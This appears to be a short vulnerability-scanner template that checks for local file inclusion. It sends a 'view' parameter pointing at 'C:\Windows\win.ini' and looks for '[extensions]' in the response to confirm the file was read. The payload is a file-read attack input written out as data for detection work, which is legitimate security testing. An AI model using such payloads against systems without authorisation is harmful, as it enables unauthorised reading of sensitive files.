id: lfi6-0331
name: 'Traversal in view'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via view'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      view:
        - 'C:\Windows\win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
